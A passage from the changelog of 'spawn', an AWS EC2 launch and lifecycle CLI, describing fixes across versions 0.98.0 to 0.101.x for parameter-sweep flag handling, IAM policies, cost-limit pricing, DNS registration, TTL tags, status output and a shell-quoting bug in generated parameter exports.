  class this week (#524, #525, #539). `--volume-size` and `volume_size:` are
  now both wired into the sweep path with the same precedence rule established
  by #525/#539: a row's own `volume_size:` beats `--volume-size` on the command
  line, which beats the file's `defaults:`. `disk_size:` remains a rejected
  near-miss spelling, now pointing at the real key (`volume_size:`) instead of
  the nonexistent flag.

- `spawn launch --estimate-only`, `spawn service --dry-run`, and `spawn cost`
  now price instances through truffle (the suite's pricing authority, #533)
  instead of libs/pricing's static per-family-size guess table, which
  under-quoted an unknown family/size by up to 38x — e.g. `c8g.metal-48xl` in
  us-east-1 showed $0.20/hr against a real $7.657/hr, because the table's one
  `"metal"` size-multiplier entry doesn't match the modern `metal-Nxl` spelling
  and silently fell through to a 2.0x "default to xlarge" multiplier. All
  three surfaces now print the price's source (`live` or `static fallback`)
  next to the rate, and report a pricing miss explicitly rather than
  substituting a fabricated number. This is the display-side half of #533,
  which fixed the same fabrication for `--cost-limit` enforcement only.
  (#543)

- **`dns.enabled: false` in `~/.spawn/config.yaml` was parsed but never
  consulted — there was no way to skip DNS registration short of
  `--wait-for-ssh=false`, which also (undesirably) skips the SSH-readiness
  wait** (#549). Worse, `dns.enabled` was a plain bool with no
  "unspecified" state, so ANY config file that existed but didn't mention
  `dns:` unmarshaled `Enabled` to `false` and silently disabled DNS
  registration for every named launch. `DNSConfig.Enabled` is now a
  tri-state (`*bool`): absent means "use the default (enabled)", matching
  the observed pre-fix behavior for everyone who never touched `dns:`.
- **DNS registration's retry loop always burned the full 4-minute retry
  deadline on a permanently-unresolvable `dns.api_endpoint` hostname**
  (stale/placeholder config, or an account not wired for spore.host DNS —
  which is the *expected* case per the code's own comment), even though
  `curl exit 6` (couldn't resolve host) was only meant to model the
  guest's DNS resolver not being populated yet at early boot (observed up
  to ~90s) (#548). Measured cost: ~$7.60 of wasted instance-hours per
  3-host fleet launch, recurring on every relaunch. `registerDNS` now
  resolves the endpoint hostname from the controller BEFORE starting the
  guest-side SSH retry loop; only a definitive NXDOMAIN
  (`net.DNSError.IsNotFound`) short-circuits straight to the non-fatal
  warning — a transient controller-side lookup failure (timeout,
  temporarily unreachable resolver) still falls through to the existing
  retry loop unchanged, so the genuinely-transient early-boot case is not
  affected.

## [0.101.0] - 2026-08-19

### Added
- `spored status` now supports `--output json` (`-o json`), emitting the same
  facts the human table shows — sentinel/on-complete state, TTL deadline,
  cost-limit consumed, and effective hourly rate — as a single JSON object on
  stdout (#540).

### Fixed
- **A parameter sweep silently discarded `--iam-role`, `--iam-policy`,
  `--iam-policy-file`, `--iam-role-tags` and `--iam-allow-full-access`, giving
  every instance the shared `spored-instance-role` regardless of what was
  requested — no warning, exit 0** (#539). The single-instance and batch-queue
  launch paths read these flags to build (or reuse) a custom role/policy; the
  sweep path called `SetupSporedIAMRole()` unconditionally and never looked at
  any of them, so a `--iam-policy-file` naming a workload's actual permissions
  parsed and was thrown away. This is the same bug class as #525 (CLI spend
  controls dropped on the sweep path) but more expensive to discover: a
  wrong/missing IAM role means the workload dies on its first AWS API call with
  `AccessDenied`, which reads as a workload bug rather than a launch-flag bug —
  so the entire run's compute spend can produce zero result before anyone
  suspects the launch flags.

  The flags are now resolved into a real instance profile once per sweep (the
  same `CreateOrGetInstanceProfile` call the single-instance path makes per
  instance) and folded into sweep `defaults:` — the one place that reaches both
  orchestration paths, mirroring #525's fix: the foreground path merges
  defaults into every row via the existing `iam_role:` param-file key, and the
  detached path uploads defaults to S3 for the Lambda orchestrator, which reads
  `iam_role` from there too. Precedence is most-specific-wins, same as #525: a
  row's own `iam_role:` > the CLI flag > the file's `defaults:`. A sweep with no
  CLI IAM flags and no file-level `iam_role:` still falls back to the shared
  `spored-instance-role`, unchanged from before this fix.

- **`spawn status <id> -o json` printed the human-readable table, not JSON, with
  spored's own log lines ahead of it** (#540). Two independent bugs: (1)
  `--output json` was accepted but silently ignored by `status` — every other
  read command already honoured it, `status` was the outlier; (2) the SSH
  transport `cmd/status.go` used to fetch the remote `spored status` output
  redirected the remote process's stderr into its stdout (`2>&1`) before the
  bytes ever crossed the SSH channel, so spored's `log.Printf` diagnostics
  (agent init, config, DNS skip, idle checks) landed on spawn's own stdout no
  matter what spawn did on its end. A caller doing
  `json.loads(subprocess.check_output(...))` got `Extra data` at char 4.

  Fixed by implementing `--output json` in `spored status` itself (backed by a
  single `statusReport` struct so the table and JSON renderers can't drift),
  dropping the remote-side `2>&1`, and capturing the SSH/SSM transport's
  stdout and stderr as separate streams end-to-end. `spawn status -o json`'s
  stdout is now pure JSON; every diagnostic and supplementary notice (TTL
  reconciliation, lifecycle protection, DNS status, upgrade nudge, Elastic IP)
  goes to stderr in JSON mode. `-o table` (the default) is unchanged.

### Security
- Bumped `golang.org/x/mod` (indirect, via `pkg/plugin`/sigstore) v0.37.0 → v0.40.0,
  fixing CVE-2026-56864/CVE-2026-56865 (HIGH) — a malicious GOSUMDB/GOPROXY could
  forge module checksums. Trivy's security gate started failing on every open PR
  once its vulnerability DB picked up these CVEs, independent of any code change.

### Fixed
- **`spawn list --state all` always returned an empty list, regardless of how
  many instances existed** (#527). `"all"` was passed straight through to EC2 as
  a literal `instance-state-name` filter value, and no instance is ever
  literally in state `"all"`, so the filter matched nothing — exit 0, a
  well-formed empty JSON array, reading exactly like a clean account even when
  it wasn't. This is the command the docs recommend for "did anything leak?",
  so the bug gave false confidence at the worst possible moment.

  `--state all` (and the alias `--state any`) now means no state filter at
  all — a genuine superset of the default that also surfaces
  `terminated`/`shutting-down` instances (AWS retains those for about an
  hour). The no-flag default (`pending`, `running`, `stopping`, `stopped`) is
  unchanged. Any other unrecognized `--state` value — a typo like `runing`, or
  wrong case like `ALL` — is now a hard error naming the valid states, instead
  of silently degrading to an empty result.

- **A param-file key written one level too high — outside `defaults:`/`grid:`/`params:`
  — vanished with no trace at all, not even a `PARAM_*` env var** (#530).
  `pkg/params.ParamFileFormat` has exactly three fields, and both the JSON and
  YAML parsers unmarshalled straight into it with no check for anything else,
  so a top-level `ttl:`, `idle_timeout:`, or `cost_limit:` — an easy mistake,
  and the same shape one level up from the row-level keys #526 already fixed
  — silently produced an unbounded instance. Two of spawn's own shipped
  examples had this exact bug: `examples/simple-params.yaml` put
  `region:`/`instance_type:`/`ami:` at the top level, and
  `examples/schedule-params.yaml` put `sweep_name:`/`max_concurrent:`/
  `launch_delay:`/`instance_type:`/`ami:`/`disk_size:` there, none of which
  `cmd/schedule.go` reads from anywhere but `defaults:`. Both are fixed in
  this change.

  A top-level key that IS a recognized spawn setting (reusing #526's
  key registry) is now a hard error before anything is launched or priced,
  naming the key and telling the user to move it under `defaults:`. Anything
  else unrecognized — `description:`, `version:`, and other harmless
  metadata — is a warning, not an error, printed to stderr so it has
  somewhere to be noticed without breaking files that already carry it. The
  check runs on both `spawn launch --param-file` (including `spawn resume`,
  which reloads the file independently) and `spawn schedule create`, which
  parses parameter files with its own separate, unrelated code path.

- **A parameter sweep value could be shell-reinterpreted, or silently mangled,
  on the instance** (#531). `pkg/launcher/bootstrap.go` wrote each
  `spawn:param:*` tag into `/etc/profile.d/spawn-params.sh` as
  `export PARAM_<name>="<value>"`, double-quoting the raw value with no
  escaping. `/etc/profile.d/*.sh` is sourced by every login shell, so `$`,
  backticks, and `"` in a value were reinterpreted at boot instead of taken
  literally: `$HOME/out` became the instance's actual home directory instead
  of the string the user wrote, a value with a backtick ran a command, and an
  embedded double quote (`run "A"`) broke the generated line's quoting
  outright. Nothing failed — the workload just quietly ran with a different
  value than the param file specified. (#526 fixed the identical issue on the
  key side of this same line; this closes the value side.)

  The value is now single-quoted, with any embedded single quote escaped via
  the standard close-quote/escaped-quote/reopen-quote trick, which makes `$`,
  backticks, and `"` inert. Separately, a parameter value containing a literal
  newline is now rejected at launch time, before anything is provisioned: a
  newline cannot survive the round trip through an EC2 tag and back through
  the bootstrap's one-tag-per-line parsing loop, so encoding around it isn't
  worth attempting — the launch fails with an error naming the offending
  parameter instead of producing a malformed line on the instance.

- **`--cost-limit` was enforced against a fabricated price, not the real
  on-demand rate** (#533). At launch, when `PricePerHour` wasn't already known,
  spawn called its own hand-rolled, uncached AWS Pricing API lookup
  (`LookupEC2OnDemandPrice`) and, if that failed — which it always did for any
  principal onboarded via `spawn onboard`, whose policy granted no `pricing:*`
  action — fell back to a static per-family-size guess table
  (`libs/pricing.GetEC2HourlyRate`) missing every current-gen instance family
  (g6, g6e, p5, p5e, c7g, c8g, ...). Measured: `g6e.xlarge` guessed at
  $0.20/hr against a real $1.861/hr (9.3x under); `p5.48xlarge` guessed at
  $9.60/hr against a real $55.04/hr (5.7x under). The fabricated value was
  written to `spawn:price-per-hour` and is what `--cost-limit` is actually
  checked against in-instance, so a `--cost-limit 8` on `g6e.xlarge` didn't
  fire until roughly $74 of real spend.

  Pricing at launch now delegates entirely to truffle's `OnDemandPriceWithSource`
  — the suite's pricing authority, with a 24h cache and a real-published-rate
  static fallback that errors rather than guesses (truffle#114/#115). If
  truffle cannot price the instance at all (neither live nor its own static
  table) and the launch requested `--cost-limit`, the launch now fails with an
  error naming the instance type, region, and limit, instead of silently
  leaving the cap unenforced. Without `--cost-limit`, an unpriceable instance
  still launches, with `PricePerHour` left unset (spored's cap-check already
  treats 0 as "no cap enforced," never a fabricated one). spawn's own
  `LookupEC2OnDemandPrice` is removed.

### Changed
- **Bumped `github.com/spore-host/truffle` v0.49.0 → v0.53.0**, since
  `--cost-limit` enforcement now depends on truffle's pricing API. Pulled in
  transitively: `find`/`spot` multi-type queries, per-GPU VRAM/fractional-GPU
  metadata, `find --show-real-cores`/`--show-mem-per-cpu`/`--price-unit`, and
  several Capacity Block/Reservation discovery-path error-handling fixes. No
  breaking changes to the APIs spawn calls (`OnDemandPrice`,
  `OnDemandPriceWithSource`, `GetCapabilities`).
- **`spawn onboard`'s IAM policy now grants `pricing:GetProducts`** (a
  global, read-only action with no resource scoping), required for the fix
  above — the pricing lookup still runs under the launching principal's own
  credentials, in-process via truffle, not a separate service. **Operational
  step for existing users:** a principal onboarded before this change has no
  `pricing:GetProducts` permission and must re-run `spawn onboard` to pick it
  up; until then, truffle's pricing lookup will fail on that principal (falling
  back to truffle's own static table, or failing the launch outright if
  `--cost-limit` was requested and no static price exists for the type).

## [0.100.4] - 2026-08-19

### Fixed
- **A param-file key that looked like a spawn setting silently became a
  `PARAM_*` env var and did nothing** (#526). Every unrecognised key fell through
  to the passthrough arm, which is correct for a workload parameter and disastrous
  for a misspelled setting: `ttl_hours: 4`, `on-complete: terminate`, `budget: 50`
  and `max_concurrent: 3` all launched normally and bounded nothing. The first two
  leave a running instance, which is the version of this bug that costs money.

  Passthrough is unchanged for real parameters. A key is now rejected before
  anything is launched or priced when it is (a) not a valid shell identifier — the
  bootstrap writes each parameter into `/etc/profile.d` as
  `export PARAM_<key>="<value>"`, so `PARAM_on-complete` is a line the shell
  refuses, (b) a recognised key written with hyphens or in the wrong case, or (c)
  on a curated list of CLI-only flags and near-misses, each carrying the correct
  spelling in the error. All offending keys are reported at once rather than one
  per run, and the `PARAM_*` variables a sweep *will* set are now listed in the
  sweep header so an unintended passthrough has somewhere to be noticed.

  Because a reserved name would otherwise be a dead end for anyone whose workload
  genuinely has a parameter called `budget` or `time_limit`, an explicit
  `param:<name>:` prefix passes any name straight through as `PARAM_<name>`.
  Ambiguous English words are deliberately absent from the list — `timeout` is
  documented step vocabulary (`examples/workflow-ci-pipeline.yaml`), and `image`,
  `type`, `count`, `steps`, `instance` and `runtime` are all plausible sweep
  parameters. The same check runs at the config-merge seam too, so `spawn resume`
  cannot rebuild an instance from a file the launch path would have refused.
- **A parameter sweep silently discarded `--ttl`, `--idle-timeout` and
  `--cost-limit`, then logged `Using safeguards: ttl=...`** (#525).
  `buildLaunchConfigFromParams` starts from an empty config and the sweep
  dispatch copied only `Region`/`InstanceType`/`Name` off the base config, so no
  CLI spend control reached a single row — while the `--no-detach` branch printed
  a safeguards line from the very variables it was about to throw away, which is
  worse than dropping them quietly: it affirmatively tells the operator a cap is
  active at the instant it is discarded. `cost_limit:` in a param file did not
  work either — there was no parser case, so it fell through to the unknown-key
  arm and became a `PARAM_cost_limit` env var that capped nothing. With both
  routes broken a sweep had no per-instance dollar cap at all, and its only bound
  was the zombie guard's unrelated 1h *idle* timeout, which never fires on a
  compute-bound row yet still shows up in `spawn list` and reads as bounded.

  The flags are now applied as sweep `defaults:` — the one place that reaches both
  orchestration paths, since the foreground path merges defaults into every row
  and the detached path uploads them to S3 for the Lambda orchestrator — and
  `cost_limit:` is a real parser case that *errors* on a value it cannot read
  rather than leaving the cap at 0. Precedence is most-specific-wins: a row's own
  `params:` > the CLI flag > the file's `defaults:`.

  Two knock-on fixes in the same path: `--estimate-only` now prices the TTL you
  passed (previously `--ttl 4h` on a file with no `ttl:` was quoted at the
  estimator's 1h default, understating the worst case fourfold), and the
  `--no-detach` guard checks the merged **per-row** bound instead of the CLI
  variable. A `ttl:` in the param file used to be refused by that guard even
  though it was the value which actually reached the instances, so the only way
  through was to pass `--ttl` to satisfy the check and have it discarded — one
  flag to pass the guard, another to take effect. The per-row form also catches a
  file that bounds only *some* of its rows, which a check on the CLI variable
  could not see, and names the offending rows.
- **`--estimate-only` launched every row of a parameter sweep instead of
  estimating it** (#524). The flag was checked only inside
  `launchSweepDetached`, so any sweep that took the *foreground* path
  provisioned the whole sweep while the user was asking for a preview — i.e.
  the exact command run to avoid spending money spent it. Two ordinary
  invocations reach that path: `--no-detach` (the documented advice for a
  heterogeneous sweep, since only the foreground path detects an AMI per
  config, #372), and an explicit `--detach` without `--max-concurrent`, which
  leaves `maxConcurrent` at 0 and so fails the `detach && maxConcurrent > 0`
  dispatch condition. `--estimate-only` is now handled once in
  `launchParameterSweep`, above that dispatch and before the AWS client is
  built (a cost preview reads only the param file, so it needs no
  credentials), which makes "launches nothing" independent of which
  orchestration path the sweep would have taken. Covered by a Tier 0 e2e
  regression test that asserts zero instances exist afterwards by querying EC2
  directly, for all three invocations.

## [0.100.3] - 2026-08-18

### Fixed
- **`spawn extend --job-array-id`/`--job-array-name` discarded the per-instance
  reload error** (#512). The single-instance `spawn extend` path already warns
  and prints a manual `ssh ... sudo spored reload` fallback when the
  on-instance reload trigger fails after a successful tag write; the
  job-array path called `triggerReload` the same way but threw the error away
  with `_ = triggerReload(&inst)`. A caller extending N instances at once had
  no way to tell which ones actually picked up the new TTL on-instance vs.
  which are silently running on stale config until the next periodic tag
  refresh (every 5 minutes in production). The job-array path now tracks and
  reports reload failures per instance (with the same manual-fallback
  message), and the summary output shows a `Reloaded:` count when any
  instance's reload failed even though its tag write succeeded.
- **`spored`'s self-management IAM baseline was missing `ec2:DescribeVolumes`,
  so the EBS storage-cost lookup always 403'd under the policy spawn itself
  provisions** (#517). `LookupAndTagEBSCost` needs `DescribeInstances` (to get
  the block-device mappings) and then `DescribeVolumes` (to get the actual
  volume sizes/types to price them) — only the first was granted. Since #502
  made `spored-baseline-policy` apply to every spawn-launched instance, the
  lookup could never succeed in the default configuration, `spawn:ebs-hourly-cost`
  was never written, and `spored status`'s storage-cost line stayed permanently
  "not yet available". Added `ec2:DescribeVolumes` to the baseline policy
  (same `Resource: "*"` statement — Describe APIs don't support resource-level
  scoping, so this widens nothing that wasn't already wide).
- **The un-measured EBS-cost fallback (a bare `0.003`) was logged in the same
  shape as a real measurement**, making the two indistinguishable from the log
  alone — a reader comparing the daemon's own "EBS hourly cost: $0.0030/hr"
  line against `spored status`'s "not yet available" storage line for the
  same instance got contradictory answers. `Provider.LookupAndTagEBSCost` now
  returns `(cost float64, measured bool)`; the caller only logs a rate when
  `measured` is true, and logs an explicit "unknown (lookup failed or denied)"
  line otherwise.
- **`pkg/mpicohort`'s `Actuator.ensurePlacementGroup` had a check-then-act
  race**: the mutex was released between checking whether an AZ's placement
  group was already created and calling `CreatePlacementGroup`, so concurrent
  cohort members in the same newly-visited AZ (the normal case — a round
  launches N members at once) could each observe "not created yet" and each
  call `CreatePlacementGroup`, defeating the once-per-AZ design that exists to
  avoid the ~30s availability poll for every member of a round (#514,
  surfaced by a CI flake in `TestActuator_PerAZPlacementGroup`). Concurrent
  callers for the same AZ now coalesce onto a single in-flight
  `CreatePlacementGroup` call instead of each issuing their own; callers for
  different AZs are not serialized against each other.
- **`spawn cleanup --dry-run` (and `orphans`) reported already-destroyed
  resources as "would be removed"** (#516). Two compounding defects: (1)
  `enrichInstanceState`'s NotFound fallback only triggers on a batch
  `DescribeInstances` *error*, but EC2 answers an aged-out (long-terminated)
  instance id with an empty *result*, not an error — so `State` stayed `""`
  for exactly the population `cleanup` exists to sweep, and (2) the
  removable/running/address split in `cmd/cleanup.go` never consulted
  `State` at all, so even a resource correctly resolved to `deleted` (e.g.
  volumes, which *do* 400 on an already-deleted id) still landed in
  `removable` and in the "N resource(s) would be removed" count — visibly
  contradicting its own displayed `deleted` state in the same table. Fixed
  both: an instance id absent from a successful `DescribeInstances` response
  is now marked `deleted` directly (no longer relies on an error EC2 doesn't
  raise for this case), and `cleanup`'s split now routes `State == "deleted"`
  into its own bucket, excluded from the removable count and reported
  separately as tag-mapping residue. Also added `ignoreNotFound` tolerance to
  the instance branch of `RemoveResource`, matching its volume/key-pair/
  security-group siblings, so a real (non-dry-run) sweep of stale residue
  reports a satisfied request instead of a doomed `Terminate` failure.
- **`spawn status`/`spored status` could print mutually contradictory
  lifecycle statements in one screen, and misreported an instance's actual
  age** (#508). Three related defects:
  1. When `spored` couldn't read its own tags (e.g. the #502 IAM gap, or any
     `ec2:DescribeTags` denial), the config load failure was silently
     swallowed into zero-value defaults, and status rendered `TTL: none —
     instance will not auto-terminate` — a definite claim asserted from data
     that was never actually read. It now renders `TTL: UNKNOWN — could not
     read config (<error>)` in that case, via a new `Config.ConfigLoadError`
     field threaded from the provider's tag-load failure.
  2. That on-instance "none"/"UNKNOWN" line could appear directly above
     `spawn status`'s own `Termination deadline: <t>` (read from tags with
     the *caller's*, not the instance's, credentials) with nothing
     connecting the two. `spawn status` now detects this specific
     combination and prints an explicit "Lifecycle mismatch" notice: the
     deadline tag exists, but the instance cannot see it, so nothing on the
     instance will enforce it.
  3. `Started`/`Elapsed` described the *status-agent invocation's* age, not
     the instance's — falling back to `time.Now()` when the
     `spawn:launch-time` tag couldn't be read, which is exactly the failure
     mode above, so a 7h39m-old instance reported `Elapsed: 0s`. Added a
     second fallback tier: EC2's own `PendingTime` from the instance identity
     document (via IMDS, no IAM permission required), so the instance's real
     age survives a tag-read failure and only falls back to the agent's own
     start time when IMDS is also unavailable. The fallback source is now
     labelled inline when it isn't the authoritative tag.
- **Two lifecycle tags asserted things about an instance that weren't
  true** (#515). `spawn:version` was hard-coded to the literal `"0.1.0"` in
  `buildTags`, so every instance spawn has ever launched carried that value
  regardless of the actual running spawn — worse than an absent tag, since
  it looks like an answer to "was this instance launched by a spawn that
  predates fix X?" and always gives the wrong one. It now reflects the
  actual launching spawn's resolved version (`LaunchConfig.SpawnVersion`,
  pushed in once from `cmd.version()`/`pkg/buildinfo` via a new
  `aws.CallerVersion` seam — `pkg/aws` can't import `cmd` directly) and is
  omitted, not written as a false placeholder, when a caller doesn't supply
  one. Separately, `spawn:completion-file` was written whenever
  `--completion-file` was non-empty, but that flag has a non-empty default
  (`/tmp/SPAWN_COMPLETE`) — so a launch that never passed `--on-complete`
  still got a completion-file tag describing a watch with no action attached.
  The two tags are now written atomically: `spawn:completion-file` only
  alongside `spawn:on-complete` (spored's own config load already defaults
  the file path when `on-complete` is set but no file was tagged, so nothing
  regresses for a caller who *did* ask for completion handling).

## [0.100.2] - 2026-08-18

### Fixed
- **`spored reload` (and therefore `spawn extend`'s on-instance reload) reported
  success even when the config refresh itself failed** (#505). `Agent.Reload`
  logged a failed `ec2:DescribeTags` call as a warning and continued, so a
  daemon that could not read its own tags still printed "✓ Configuration
  reloaded successfully" and kept running on stale (possibly zero-value)
  config. `Reload` now returns the refresh error, which propagates through
  `spored reload`'s exit code and `spawn extend`'s SSH invocation, so the
  operator sees an actual failure instead of a false "reloaded" message.
- **`spawn extend` overwrote `spawn:ttl` with the raw extend argument instead
  of the instance's cumulative TTL** (#506). `spawn:ttl-deadline` (the
  absolute timestamp spored and the out-of-band reaper actually enforce) was
  always correctly advanced, but `spawn:ttl` — the tag every other reader
  (spored's pre-deadline fallback, `spawn stop`/`hibernate`'s remaining-TTL
  preservation) treats as "total duration from launch" — was rewritten to
  the literal `<duration>` argument each time, so a repeated `extend <id> 8h`
  looked unchanged even when the deadline had genuinely moved twice. Also
  fixes the resulting consequence in `spawn stop`/`hibernate`: the
  remaining-TTL calculation used `spawn:ttl` + `LaunchTime` directly, which
  ignored any prior `extend` calls entirely — a stop/start cycle after an
  extend could restore the wrong TTL. Both now derive from the authoritative
  `spawn:ttl-deadline` tag. `spawn extend`'s own output now shows "Extended
  by" (the argument) separately from "New TTL" (the resulting total) and the
  resolved deadline, instead of a single ambiguous "New TTL" line.

## [0.100.1] - 2026-08-17

### Fixed
- **CRITICAL: `spawn launch --iam-policy-file` omitted the spored self-management
  baseline policy, silently disabling TTL, `--on-complete`, and `--pre-stop` for
  every instance launched that way** (#502). Of the three ways to attach a
  caller policy to an instance role, two (`--iam-policies` shorthand templates,
  and the internal `InlinePolicyJSON` path used by `spawn task`/`spawn pool`)
  included the grants spored needs to read its own tags — the third
  (`--iam-policy-file`, reachable only from `spawn launch`) did not. Without
  `ec2:DescribeTags`, spored logged a `403` as a Warning and fell back to
  `TTL=0s, IdleTimeout=0s`, so a lifetime that was correctly written to
  instance tags was never read back and never enforced — observed in
  production as a fleet running 4h43m past its 8h TTL with zero lifecycle
  controls active. The spored-baseline-policy grants are now attached
  unconditionally to every instance role `CreateOrGetInstanceProfile`
  returns — new or cached, and regardless of which policy source(s) the
  caller used — instead of per-branch inside `createIAMRole`, so a future
  policy source can't reopen this gap the way `PolicyFile` did.
- **ttl-reaper: added an alarm for the reaper not running at all** (#475). The
  four alarms added in #469 all correctly use `TreatMissingData: notBreaching`
  (no sentinel datapoint genuinely is good news), but that means a reaper that
  is never invoked — a disabled EventBridge rule, a deleted schedule, reserved
  concurrency set to 0, or the function deleted outright — produces zero
  breaching datapoints across all four, so nothing pages while nothing is
  being enforced. The existing `…-invocation-errors` alarm doesn't cover it
  either: `AWS/Lambda` `Errors` requires an invocation to produce a datapoint
  at all. New `…-not-invoked` alarm on `AWS/Lambda` `Invocations`, the one
  alarm in this stack that intentionally uses `TreatMissingData: breaching`,
  since absence of data is exactly the failure it detects.

## [0.100.0] - 2026-08-11

### Added
- **`--completion-webhook-url`** (launch) and **`spawn:last-heartbeat`** EC2 tag
  (#497): closes the caller-facing gap where waiting for a launched instance's
  workload to finish meant polling an artifact against a pre-guessed
  wall-clock deadline (the exact flaw behind a real calque incident — a run
  still legitimately executing at 40 minutes had no way to be distinguished
  from "stuck," other than the caller's own guess). `--completion-webhook-url`
  makes spored POST a fire-once, best-effort notice (mirroring the existing
  `--spot-webhook-url` from #228) when the on-instance completion sentinel
  (`--completion-file`) is detected — before the grace-period sleep and
  lifecycle action — so a caller can register its own webhook/queue target
  instead of reinventing an S3-polling loop unaware of spored's own sentinel.
  Shares `--webhook-correlation`/`--webhook-timeout` with the spot webhook.
  Independently, `spawn:last-heartbeat` is now stamped with the current time
  on every monitor tick (throttled to once/minute) regardless of
  configuration — an always-on liveness signal a poller can check to tell
  "still alive and ticking" from "hung" or "gone," without needing to guess a
  timeout at all.

### Added
- **`spawn resume --max-concurrent-auto`** — the same quota-derived
  concurrency ceiling `spawn launch` gained in #492 (v0.99.0), now available
  when resuming an interrupted parameter sweep (#494). Re-derives the
  ceiling from the account's real AWS quota headroom for the PENDING
  parameter sets' instance type(s), instead of the sweep's original ceiling
  or a user-typed override — useful when resuming after the account's quota
  situation has changed (freed up, or was the reason the sweep stalled in
  the first place). Mutually exclusive with `--max-concurrent`.

  Not yet supported with `--detach` (the Lambda-orchestrated resume path):
  that path's stored parameters live in S3 with no download helper yet
  (only upload exists), and there's currently no route from `resume` to
  update the Lambda-orchestrator's stored ceiling before re-invoking.
  `--max-concurrent-auto --detach` is rejected with a clear error rather
  than silently ignored; tracked as a separate follow-up.

### Added
- **`spawn launch --max-concurrent-auto`** derives the parameter-sweep
  concurrency ceiling from the account's real AWS quota headroom instead of a
  user-typed number (#492). The sweep orchestrator's wave mechanism
  (`pkg/sweep` + `lambda/sweep-orchestrator`) already polls active-instance
  count and launches `min(available, remaining)` — but until now its ceiling
  was always a flag the caller had to already know. `--max-concurrent-auto`
  queries truffle's quota client for headroom (quota minus current usage) per
  instance family, in the region the sweep is about to launch in, and
  converts vCPU headroom to an instance count via the real per-type vCPU
  count (truffle's new `Capabilities.VCPUs`, not a guessed size suffix). A
  heterogeneous sweep's derived ceiling is the MINIMUM across every distinct
  (instance type, spot/on-demand) combination present, so a scarce family
  can't be silently outvoted by a roomier one. Mutually exclusive with
  `--max-concurrent`.

  Real-world motivation: a 10-shard fleet launch with no concurrency
  guardrail hit an account's real ceiling (a G/VT Spot quota of 64 vCPUs,
  already saturated by 8 running `g7e.2xlarge` instances) with zero prior
  warning — the actual launches then failed with
  `MaxSpotInstanceCountExceeded`.

  Not yet wired into `spawn resume`'s `--max-concurrent` override, which has
  the same class of gap; tracked as a follow-up since resuming already has a
  recorded region to work from and is a smaller retrofit.

  Requires `truffle` v0.49.0 (bumped as part of this change) for
  `QuotaInfo.SpotUsage` and `Capabilities.VCPUs`.

### Changed
- Dependency maintenance: bumped 6 GitHub Actions to their current releases
  (no behavior change).

## [0.98.0] - 2026-08-07

### Changed
- **New `pkg/ecrref` leaf package** dedupes the private-ECR-image parser
  (account ID + registry host extraction) that had drifted into three
  independent copies — `cmd/app_byo.go`, `pkg/taskproto/wrapper.go`, and the
  new `pkg/userdata/container.go` (#353) was about to make a fourth. Each
  existing `cmd`/`taskproto` function is now a one-line alias over the shared
  leaf (stdlib-only, so both `cmd` and `taskproto`'s "no cmd dependency" rule
  stay satisfied); no behavior change, no public API change.

### Added
- **`pkg/userdata.GenerateContainerUserData` + `launcher.Options.ContainerScript`
  — a headless "provision a host and `docker run <image>`" library primitive**
  (#353). Today, running a container image on a spawned instance meant
  hand-building the `aws ecr get-login-password | docker login && docker pull
  && docker run <ref>` string yourself; the only existing container-run logic
  (`cmd/app.go`'s `containerRunWrapper`) is DCV-streaming-specific — it wires
  `DISPLAY`/`XAUTHORITY` into the container for a GUI session, which a headless
  consumer (calque, a future scheduler) neither wants nor can supply. The new
  generator installs Docker on demand, authenticates to a private-ECR image
  (skipped for a public one), pulls, and runs — no DCV/X11 anywhere in it.
  GPU (`--gpus all`) is inferred from `InstanceType` via the same
  `aws.DetectGPUInstance` `Provision` already uses for AMI selection, so a
  caller doesn't separately track "is this a GPU type?" Wired through
  `Provision` after `StorageScript` (so a containerized workload sees any
  mounted volumes already live) and before `CustomUserData`.

### Changed
- CI moved off the self-hosted orion runner fleet onto `ubuntu-latest`. The
  fleet (colima/Docker on orion.local) is being decommissioned org-wide; no
  behavior change to the tool.
- **`libs` v0.43.2 → v0.43.3, `truffle` v0.48.0 → v0.48.1.** libs fixes
  `catalog.Validate()`'s overlay-image handling; truffle brings the libs bump
  plus a fix for mislabeled action pins and the orion-runner decommission
  (mirrored above). No behavior change to spawn itself.

### Security
- **Added a Dependabot config, so the SHA-pinned actions and Go deps get bumped (#485).**
  Every action here is pinned to a commit SHA, which closes the mutable-tag hole
  but opens a staleness one: a SHA never moves — including past a security fix —
  and unlike `@v6` nothing updates it for you. Pinning is only safe if something
  bumps the pins, and nothing did. `actions/checkout@v6` had already moved
  upstream while this repo went on pinning the older commit, silently.

  This matters most for `release.yaml`, which pins the release-signing actions
  (`goreleaser-action`, `cosign-installer`, `attest-build-provenance`) — the #344
  supply-chain machinery. A frozen `cosign-installer` means releases keep getting
  signed by an old cosign, and cosign 3.x already changed its CLI surface.

  Weekly, grouped, with a 7-day cooldown so a freshly-published tag isn't proposed
  the day it ships. The actions group pattern is `*` rather than `actions/*`
  precisely because those signing actions aren't under `actions/`. The `gomod`
  entry lists **all 12 modules** (root plus every `lambda/*`), since nested
  modules pin their own deps and a single `/` entry would leave eleven of them
  unmanaged. Two tests enforce both kinds of coverage, so adding an action or a
  Lambda module without wiring it up fails CI instead of going unnoticed.
  CI-only; no change to the tool.

### Fixed
- **`spawn service --upload` now rejects a bad path before launching anything.**
  `--upload` takes a value, so writing `--upload --region us-east-1` bound
  `--region` as the filename and left `us-east-1` to be parsed as an argument to
  the service — the region then went silently unset. The path is now validated
  during argument parsing, and a value that looks like a flag says so explicitly
  instead of reporting `no such file or directory: --region`.

  The ordering is the substance of the fix: the upload was already checked, but
  only after an instance was running, so a typo cost a launch. It is now caught
  at $0. A dry run with no resolved region also says why it can't quote a cost
  bound, rather than omitting the line — silence there reads as "free", and an
  unset region is the symptom of this exact mistake.
- **`spawn version` no longer reports a version from 59 releases ago.** The version
  was a hardcoded string in the source (`0.38.1`), last edited when v0.38.1 was
  released and never touched again. Releases were unaffected — the release pipeline
  overwrites it with the real tag — which is precisely why nobody noticed: the
  stale value only surfaced in builds made from source, where it was reported
  confidently and wrongly. Anyone who built spawn themselves, `go install`ed it, or
  read a version out of a bug report got `0.38.1`. It also made every source build
  claim an upgrade was available, because it compared that number against the
  release feed.

  The hand-written defaults are gone. A release still injects the tag; every other
  build now falls back to the version metadata the Go toolchain stamps in
  automatically, which cannot go stale because nobody maintains it:

  ```
  Version:    0.97.1-0.20260803020438-48ba7f76a21a+dirty   # built from a checkout
  Version:    0.98.0                                       # a release
  Version:    dev                                          # no metadata available
  ```

  A build with no version information at all says `dev` rather than inventing a
  number, and skips the update check instead of comparing against a version it
  doesn't have. `+dirty` means the working tree had uncommitted changes, so the
